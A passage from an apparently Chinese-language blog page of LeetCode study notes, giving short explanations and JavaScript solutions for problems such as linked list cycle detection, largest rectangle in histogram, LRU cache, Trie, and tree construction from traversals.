class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> n;    <span class="hljs-keyword">let</span> tail = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(n);    tail[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];    <span class="hljs-keyword">let</span> end = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>;i&lt;n;i++) &#123;        <span class="hljs-keyword">if</span>(nums[i]&gt;tail[end]) &#123;            end++;            tail[end] = nums[i];        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">let</span> left = <span class="hljs-number">0</span>;            <span class="hljs-keyword">let</span> right = end;            <span class="hljs-keyword">while</span>(left&lt;right) &#123;                <span class="hljs-keyword">let</span> mid = left + <span class="hljs-built_in">parseInt</span>((right-left)/<span class="hljs-number">2</span>);                <span class="hljs-keyword">if</span>(tail[mid] &lt; nums[i]) left = mid+<span class="hljs-number">1</span>;                <span class="hljs-keyword">else</span> right = mid;            &#125;            tail[left] = nums[i];        &#125;    &#125;    <span class="hljs-keyword">return</span> end+<span class="hljs-number">1</span>;&#125;</code></pre></div><h3 id="环形链表-II"><a href="#环形链表-II" class="headerlink" title="环形链表 II"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/" target="_blank" rel="noopener">环形链表 II</a></h3><p>要求找到环形入口，并且空间复杂度为O(1)，所以不能用hashset，用快慢指针，由于F=2S，F=S+nb <code>F比S多走了N个b环的距离，并且走的距离是S的两倍</code>，S=nb，相遇时慢指针一定走过n个环的距离，每次慢指针走到环入口一定是a+nb，所以S接下来到入口的距离就是a，此时把F放置在head，二者同时移动，相遇时就是入口</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> detectCycle = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">head</span>) </span>&#123;    <span class="hljs-keyword">var</span> slow = head;    <span class="hljs-keyword">var</span> fast = head;    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;         <span class="hljs-keyword">if</span>(fast==<span class="hljs-literal">null</span> || fast.next==<span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        slow = slow.next;        fast = fast.next.next;        <span class="hljs-keyword">if</span>(slow == fast) <span class="hljs-keyword">break</span>;    &#125;    fast = head;    <span class="hljs-keyword">while</span>(slow != fast) &#123;        slow = slow.next;        fast = fast.next;    &#125;    <span class="hljs-keyword">return</span> slow;&#125;;</code></pre></div><h3 id="柱状图中最大的矩形"><a href="#柱状图中最大的矩形" class="headerlink" title="柱状图中最大的矩形"></a><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/" target="_blank" rel="noopener">柱状图中最大的矩形</a></h3><p>从左往右依次遍历heighs，如果递增则说明此时较高的bar还有增长空间，如果遇到比前一个矮的bar，则说明之前的bar已经到达极限可以开始计算，之前的bar无论是否是等高的都可以回推左边界，因为每回推一次都更新最大面积，如果不等高则宽为1，如果等高最左边的高bar会提供最大的宽度，这样算出来的最大面积就是有效的，JS使用栈真的好方便。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> largestRectangleArea = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">heights</span>) </span>&#123;    <span class="hljs-keyword">let</span> maxArea = <span class="hljs-number">0</span>;    <span class="hljs-keyword">const</span> stack = [];    heights = [<span class="hljs-number">0</span>,...heights,<span class="hljs-number">0</span>];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;heights.length;i++) &#123;        <span class="hljs-keyword">while</span>(heights[i] &lt; heights[stack[stack.length<span class="hljs-number">-1</span>]]) &#123;            <span class="hljs-keyword">let</span> stackTopIndex = stack.pop();            maxArea = <span class="hljs-built_in">Math</span>.max(maxArea,heights[stackTopIndex]*(i-stack[stack.length<span class="hljs-number">-1</span>]<span class="hljs-number">-1</span>));        &#125;        stack.push(i);    &#125;    <span class="hljs-keyword">return</span> maxArea;&#125;;</code></pre></div><p>其中用到JS中的<a href="https://www.cnblogs.com/wangyunhui/p/7511615.html" target="_blank" rel="noopener">扩展运算符</a></p><h3 id="LRU缓存机制"><a href="#LRU缓存机制" class="headerlink" title="LRU缓存机制"></a><a href="https://leetcode-cn.com/problems/lru-cache/" target="_blank" rel="noopener">LRU缓存机制</a></h3><p>ES5和ES6的类定义方法不一样，ES5中用函数的形式，ES6可以想Java一样用class定义，使用内置对象Map，其中keys方法返回一个包含插入的键值顺序的Iterator，越晚插入的排越后面</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LRUCache</span> </span>&#123;    <span class="hljs-keyword">constructor</span>(capacity) &#123;        <span class="hljs-keyword">this</span>.capacity = capacity;        <span class="hljs-keyword">this</span>.map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();    &#125;    <span class="hljs-keyword">get</span>(key) &#123;        <span class="hljs-keyword">let</span> val = <span class="hljs-keyword">this</span>.map.get(key);        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(val) === <span class="hljs-string">'undefined'</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;        <span class="hljs-keyword">this</span>.map.delete(key);        <span class="hljs-keyword">this</span>.map.set(key,val);        <span class="hljs-keyword">return</span> val;    &#125;    put(key,value) &#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.map.has(key)) <span class="hljs-keyword">this</span>.map.delete(key);        <span class="hljs-keyword">this</span>.map.set(key,value);        <span class="hljs-keyword">let</span> keys = <span class="hljs-keyword">this</span>.map.keys();        <span class="hljs-keyword">while</span>(<span class="hljs-keyword">this</span>.map.size&gt;<span class="hljs-keyword">this</span>.capacity) <span class="hljs-keyword">this</span>.map.delete(keys.next().value);    &#125;&#125;</code></pre></div><h3 id="实现-Trie-前缀树"><a href="#实现-Trie-前缀树" class="headerlink" title="实现 Trie (前缀树)"></a><a href="https://leetcode-cn.com/problems/implement-trie-prefix-tree/" target="_blank" rel="noopener">实现 Trie (前缀树)</a></h3><p>搜索词语和搜索前缀只有判定isEnd不同</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Initialize your data structure here.</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrieNode</span> </span>&#123;    <span class="hljs-keyword">constructor</span>() &#123;        <span class="hljs-keyword">this</span>.next = &#123;&#125;;        <span class="hljs-keyword">this</span>.isEnd = <span class="hljs-literal">false</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Trie</span> </span>&#123;    <span class="hljs-keyword">constructor</span>() &#123;        <span class="hljs-keyword">this</span>.root = <span class="hljs-keyword">new</span> TrieNode();    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">    * Inserts a word into the trie. </span><span class="hljs-comment">    * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">word</span></span></span><span class="hljs-comment">    * <span class="hljs-doctag">@return <span class="hljs-type">&#123;void&#125;</span></span></span><span class="hljs-comment">    */</span>    insert(word) &#123;        <span class="hljs-keyword">let</span> node = <span class="hljs-keyword">this</span>.root;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;word.length;i++) &#123;            <span class="hljs-keyword">if</span>(!node.next[word[i]]) node.next[word[i]] = <span class="hljs-keyword">new</span> TrieNode();            node = node.next[word[i]];        &#125;        node.isEnd = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">    * Returns if the word is in the trie. </span><span class="hljs-comment">    * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">word</span></span></span><span class="hljs-comment">    * <span class="hljs-doctag">@return <span class="hljs-type">&#123;boolean&#125;</span></span></span><span class="hljs-comment">    */</span>    search(word) &#123;        <span class="hljs-keyword">let</span> node = <span class="hljs-keyword">this</span>.searchPrefix(word);        <span class="hljs-keyword">return</span> node!=<span class="hljs-literal">null</span> &amp;&amp; node.isEnd;    &#125;    searchPrefix(word) &#123;        <span class="hljs-keyword">let</span> node = <span class="hljs-keyword">this</span>.root;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;word.length;i++) &#123;            <span class="hljs-keyword">if</span>(node.next[word[i]]) node = node.next[word[i]];            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        &#125;        <span class="hljs-keyword">return</span> node;    &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">    * Returns if there is any word in the trie that starts with the given prefix. </span><span class="hljs-comment">    * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">prefix</span></span></span><span class="hljs-comment">    * <span class="hljs-doctag">@return <span class="hljs-type">&#123;boolean&#125;</span></span></span><span class="hljs-comment">    */</span>     startsWith(prefix) &#123;        <span class="hljs-keyword">let</span> node = <span class="hljs-keyword">this</span>.searchPrefix(prefix);        <span class="hljs-keyword">return</span> node !=<span class="hljs-literal">null</span>;    &#125;&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * Your Trie object will be instantiated and called as such:</span><span class="hljs-comment"> * var obj = new Trie()</span><span class="hljs-comment"> * obj.insert(word)</span><span class="hljs-comment"> * var param_2 = obj.search(word)</span><span class="hljs-comment"> * var param_3 = obj.startsWith(prefix)</span><span class="hljs-comment"> */</span></code></pre></div><h3 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a><a href="https://leetcode-cn.com/problems/hamming-distance/" target="_blank" rel="noopener">汉明距离</a></h3><p>布赖恩·克尼根算法，x异或x-1可以消除最右侧的1</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> hammingDistance = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) </span>&#123;    <span class="hljs-keyword">var</span> xor = x ^ y;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>(xor) &#123;        res++;        xor &amp;= xor<span class="hljs-number">-1</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="寻找重复数"><a href="#寻找重复数" class="headerlink" title="寻找重复数"></a><a href="https://leetcode-cn.com/problems/find-the-duplicate-number/" target="_blank" rel="noopener">寻找重复数</a></h3><p>类似环形链表找入口，因为有重复数，所以必定存在环，按索引找下一个节点<code>i=nums[i]</code></p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> findDuplicate = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">let</span> slow = <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> fast = <span class="hljs-number">0</span>;    <span class="hljs-keyword">do</span> &#123;        slow = nums[slow];        fast = nums[nums[fast]];    &#125;<span class="hljs-keyword">while</span>(slow != fast)    slow = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>(slow != fast) &#123;        slow = nums[slow];        fast = nums[fast];    &#125;    <span class="hljs-keyword">return</span> slow;&#125;;</code></pre></div><h3 id="找到所有数组中消失的数字"><a href="#找到所有数组中消失的数字" class="headerlink" title="找到所有数组中消失的数字"></a><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/" target="_blank" rel="noopener">找到所有数组中消失的数字</a></h3><p>自己的做法是将数组中的元素与下标一一对应，如果有数字没有在它“正确”的位置上就说明这个位置缺少数字，但这样做时间复杂度貌似不符合要求。。</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number[]&#125;</span> <span class="hljs-variable">nums</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number[]&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> findDisappearedNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) </span>&#123;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;nums.length;i++) &#123;        <span class="hljs-keyword">while</span>(nums[i]!=i+<span class="hljs-number">1</span> &amp;&amp; nums[nums[i]<span class="hljs-number">-1</span>]!=nums[i]) swap(nums,i);     &#125;    <span class="hljs-keyword">let</span> res = [];    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i&lt;nums.length;i++) &#123;        <span class="hljs-keyword">if</span>(nums[i] != i+<span class="hljs-number">1</span>) res[j++]=i+<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span>(<span class="hljs-params">nums,i</span>) </span>&#123;    <span class="hljs-keyword">let</span> tmp = nums[nums[i]<span class="hljs-number">-1</span>];    nums[nums[i]<span class="hljs-number">-1</span>] = nums[i];    nums[i] = tmp; &#125;</code></pre></div><p>官方解答是遍历原数组，将<code>nums[nums[i]-1]</code>*-1，如果已经是负数则不需要再×-1，遍历完成后只有缺失数字的下标处对应的数组值是正值。</p><h3 id="找到字符串中所有字母异位词"><a href="#找到字符串中所有字母异位词" class="headerlink" title="找到字符串中所有字母异位词"></a><a href="https://leetcode-cn.com/problems/find-all-anagrams-in-a-string/" target="_blank" rel="noopener">找到字符串中所有字母异位词</a></h3><p>解答做法是用滑动窗口，因为不需要与匹配字符串完全相同，所以用HashMap统计每个字符出现的次数，与匹配符相同就可以了，但是录入时就需要注意控制窗口的大小与匹配符一样大才行</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">s</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">p</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number[]&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> findAnagrams = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s, p</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = [];    <span class="hljs-keyword">let</span> left=<span class="hljs-number">0</span>, right=<span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> needs=&#123;&#125;,windows=&#123;&#125;;    <span class="hljs-keyword">let</span> match=<span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;p.length;i++) &#123;        needs[p[i]]?needs[p[i]]++:needs[p[i]]=<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">let</span> needsLen = <span class="hljs-built_in">Object</span>.keys(needs).length;    <span class="hljs-keyword">while</span>(right &lt; s.length) &#123;        <span class="hljs-keyword">let</span> c1 = s[right];        <span class="hljs-keyword">if</span>(needs[c1]) &#123;            windows[c1]?windows[c1]++:windows[c1]=<span class="hljs-number">1</span>;            <span class="hljs-keyword">if</span>(windows[c1] == needs[c1]) match++;        &#125;        right++;        <span class="hljs-keyword">while</span>(match == needsLen) &#123;            <span class="hljs-keyword">if</span>(right-left == p.length) res.push(left);            <span class="hljs-keyword">let</span> c2 = s[left];            <span class="hljs-keyword">if</span>(needs[c2]) &#123;                <span class="hljs-keyword">if</span>(--windows[c2] &lt; needs[c2]) match--;            &#125;            left++;        &#125;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="除法求值"><a href="#除法求值" class="headerlink" title="除法求值"></a><a href="https://leetcode-cn.com/problems/evaluate-division/" target="_blank" rel="noopener">除法求值</a></h3><p>这是并查集做法，也可以把关系看成图的边，求解就是找图中两点是否存在路径，可以用DFS，BFS</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> calcEquation = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">equations, values, queries</span>) </span>&#123;    <span class="hljs-keyword">let</span> parentMap = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();    <span class="hljs-keyword">let</span> valueMap = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; equations.length; i++) &#123;        <span class="hljs-keyword">if</span> (!parentMap.has(equations[i][<span class="hljs-number">0</span>])) &#123;            parentMap.set(equations[i][<span class="hljs-number">0</span>], equations[i][<span class="hljs-number">0</span>]);        &#125;        <span class="hljs-keyword">if</span> (!parentMap.has(equations[i][<span class="hljs-number">1</span>])) &#123;            parentMap.set(equations[i][<span class="hljs-number">1</span>], equations[i][<span class="hljs-number">1</span>]);        &#125;        <span class="hljs-keyword">if</span> (!valueMap.has(equations[i][<span class="hljs-number">0</span>])) &#123;            valueMap.set(equations[i][<span class="hljs-number">0</span>], <span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">if</span> (!valueMap.has(equations[i][<span class="hljs-number">1</span>])) &#123;            valueMap.set(equations[i][<span class="hljs-number">1</span>], <span class="hljs-number">1</span>);        &#125;        union(parentMap, valueMap, equations[i][<span class="hljs-number">0</span>], equations[i][<span class="hljs-number">1</span>], values[i]);    &#125;    <span class="hljs-keyword">const</span> result = [];        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; queries.length; i++) &#123;        <span class="hljs-keyword">let</span> tmp1 = find(parentMap, valueMap, queries[i][<span class="hljs-number">0</span>]);        <span class="hljs-keyword">let</span> tmp2 = find(parentMap, valueMap, queries[i][<span class="hljs-number">1</span>]);        <span class="hljs-keyword">if</span> (!tmp1 || !tmp2) &#123;            result.push(<span class="hljs-number">-1.0</span>);            <span class="hljs-keyword">continue</span>;        &#125;        <span class="hljs-keyword">if</span> (tmp1.index === tmp2.index) &#123;            result.push(tmp1.value / tmp2.value);        &#125;        <span class="hljs-keyword">else</span> &#123;            result.push(<span class="hljs-number">-1.0</span>);        &#125;         &#125;    <span class="hljs-keyword">return</span> result;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">union</span>(<span class="hljs-params">parentMap, valueMap, index1, index2, value</span>) </span>&#123;    <span class="hljs-keyword">let</span> tmp1 = find(parentMap, valueMap, index1);    <span class="hljs-keyword">let</span> tmp2 = find(parentMap, valueMap, index2);    parentMap.set(tmp1.index, tmp2.index);    valueMap.set(tmp1.index, (value * tmp2.value) / tmp1.value);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span>(<span class="hljs-params">parentMap, valueMap, index</span>) </span>&#123;    <span class="hljs-keyword">let</span> value = <span class="hljs-number">1</span>;    <span class="hljs-keyword">while</span> (parentMap.get(index) &amp;&amp; parentMap.get(index) !== index) &#123;        value *= valueMap.get(index);        index = parentMap.get(index);    &#125;    <span class="hljs-keyword">if</span> (!parentMap.get(index)) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;    &#125;    <span class="hljs-keyword">return</span> &#123;        index,        value    &#125;;&#125;</code></pre></div><h3 id="二叉树的直径"><a href="#二叉树的直径" class="headerlink" title="二叉树的直径"></a><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/" target="_blank" rel="noopener">二叉树的直径</a></h3><p>自己写的这个递归太多所以效率很差，可以用内部函数使用res全局变量</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * function TreeNode(val) &#123;</span><span class="hljs-comment"> *     this.val = val;</span><span class="hljs-comment"> *     this.left = this.right = null;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;TreeNode&#125;</span> <span class="hljs-variable">root</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> diameterOfBinaryTree = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">return</span> calmax(root);&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">caldistance</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">let</span> lefthigh=<span class="hljs-number">0</span>,rigthhigh=<span class="hljs-number">0</span>;    <span class="hljs-keyword">if</span>(root.left !== <span class="hljs-literal">null</span>) lefthigh = calhigh(root.left);    <span class="hljs-keyword">if</span>(root.right !== <span class="hljs-literal">null</span>) rigthhigh = calhigh(root.right);    <span class="hljs-keyword">return</span> lefthigh+rigthhigh;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calhigh</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.max(calhigh(root.left),calhigh(root.right))+<span class="hljs-number">1</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calmax</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.max(caldistance(root),calmax(root.left),calmax(root.right));&#125;</code></pre></div><p>其中res作为全局变量进入每一轮的递归中，效率更高</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> diameterOfBinaryTree = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = <span class="hljs-number">0</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">depth</span>(<span class="hljs-params">node</span>) </span>&#123;        <span class="hljs-keyword">if</span>(node == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> L = depth(node.left);        <span class="hljs-keyword">let</span> R = depth(node.right);        res = <span class="hljs-built_in">Math</span>.max(res,L+R);        <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.max(L,R)+<span class="hljs-number">1</span>;    &#125;    depth(root);    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="字符串解码"><a href="#字符串解码" class="headerlink" title="字符串解码"></a><a href="https://leetcode-cn.com/problems/decode-string/" target="_blank" rel="noopener">字符串解码</a></h3><p>JS在返回{}这种元组的时候不是按照下标0，1，2索引的，而是传递的变量名作为key来索引</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;string&#125;</span> <span class="hljs-variable">s</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;string&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> decodeString = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">s</span>) </span>&#123;    <span class="hljs-keyword">return</span> dfs(s,<span class="hljs-number">0</span>);&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">s,i</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = <span class="hljs-string">""</span>;    <span class="hljs-keyword">let</span> num = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>(i &lt; s.length) &#123;        <span class="hljs-keyword">if</span>(s.charAt(i)&gt;=<span class="hljs-string">'0'</span> &amp;&amp; s.charAt(i)&lt;=<span class="hljs-string">'9'</span>) num = num*<span class="hljs-number">10</span> + <span class="hljs-built_in">Number</span>.parseInt(s.charAt(i));        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s.charAt(i) == <span class="hljs-string">'['</span>) &#123;            <span class="hljs-keyword">let</span> tmp = dfs(s,i+<span class="hljs-number">1</span>);            i = tmp[<span class="hljs-string">'i'</span>];            <span class="hljs-keyword">while</span>(num &gt; <span class="hljs-number">0</span>) &#123;                res = res + tmp[<span class="hljs-string">'res'</span>];                num--;            &#125;        &#125;        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s.charAt(i) == <span class="hljs-string">']'</span>) <span class="hljs-keyword">return</span> &#123;i,res&#125;;        <span class="hljs-keyword">else</span> res += s.charAt(i);        i++;    &#125;    <span class="hljs-keyword">return</span> res;&#125;</code></pre></div><h3 id="比特位计数"><a href="#比特位计数" class="headerlink" title="比特位计数"></a><a href="https://leetcode-cn.com/problems/counting-bits/" target="_blank" rel="noopener">比特位计数</a></h3><p>对于奇数，只是最后一位比它前面的偶数多了一个1，而对于偶数，除以二不会影响1的个数，只是让末尾少了一个0</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@param <span class="hljs-type">&#123;number&#125;</span> <span class="hljs-variable">num</span></span></span><span class="hljs-comment"> * <span class="hljs-doctag">@return <span class="hljs-type">&#123;number[]&#125;</span></span></span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> countBits = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>) </span>&#123;    <span class="hljs-keyword">let</span> res = [];    res[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>;i&lt;=num;i++) &#123;        <span class="hljs-keyword">if</span>(i%<span class="hljs-number">2</span> == <span class="hljs-number">1</span>) res[i] = res[i<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>;        <span class="hljs-keyword">else</span> res[i] = res[i/<span class="hljs-number">2</span>];    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><h3 id="把二叉搜索树转换为累加树"><a href="#把二叉搜索树转换为累加树" class="headerlink" title="把二叉搜索树转换为累加树"></a><a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/" target="_blank" rel="noopener">把二叉搜索树转换为累加树</a></h3><p>其实就是遍历顺序换一下，全局变量替换传参数确实方便很多</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> convertBST = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">let</span> pre = <span class="hljs-number">0</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">root</span>) </span>&#123;        <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;        dfs(root.right);        root.val += pre;        pre = root.val;        dfs(root.left);    &#125;    dfs(root);    <span class="hljs-keyword">return</span> root;&#125;;</code></pre></div><h3 id="从前序与中序遍历序列构造二叉树"><a href="#从前序与中序遍历序列构造二叉树" class="headerlink" title="从前序与中序遍历序列构造二叉树"></a><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/" target="_blank" rel="noopener">从前序与中序遍历序列构造二叉树</a></h3><p>就是想不到怎么才能控制递归中对数组访问的位置</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> buildTree = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">preorder, inorder</span>) </span>&#123;    <span class="hljs-keyword">let</span> n = preorder.length;    <span class="hljs-keyword">let</span> map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Map</span>();    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) map.set(inorder[i],i);        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>(<span class="hljs-params">preorder,inorder,preorder_left,preorder_right,inorder_left,inorder_right</span>) </span>&#123;        <span class="hljs-keyword">if</span>(preorder_left &gt; preorder_right) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;        <span class="hljs-keyword">let</span> preorder_root = preorder_left;        <span class="hljs-keyword">let</span> inorder_root = map.get(preorder[preorder_root]);        <span class="hljs-keyword">let</span> root = <span class="hljs-keyword">new</span> TreeNode(preorder[preorder_root]);        <span class="hljs-keyword">let</span> size_left = inorder_root-inorder_left;        root.left = build(preorder,inorder,preorder_left+<span class="hljs-number">1</span>,preorder_left+size_left,inorder_left,inorder_root<span class="hljs-number">-1</span>);        root.right = build(preorder,inorder,preorder_left+size_left+<span 